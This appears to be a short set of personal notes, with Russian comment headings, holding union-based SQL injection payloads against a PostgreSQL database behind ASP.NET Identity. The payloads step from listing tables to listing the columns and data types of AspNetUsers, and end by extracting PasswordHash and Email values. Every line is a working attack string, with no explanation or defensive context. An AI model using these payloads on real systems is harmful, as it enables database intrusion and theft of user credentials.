--Таблицы
x5' union all select table_schema, table_name, 1 from information_schema.tables where table_name ilike '%Users%' ; --

--Колонки
x5' union all select table_name, column_name, 1 from information_schema.columns where table_name = 'AspNetUsers';--

--с типом данных
x5' union all select table_name, column_name || '.' || data_type,  1  from information_schema.columns where table_name = 'AspNetUsers';--

--значения переменных
x5' union all select "PasswordHash", "Email", 1 from "AspNetUsers"; --


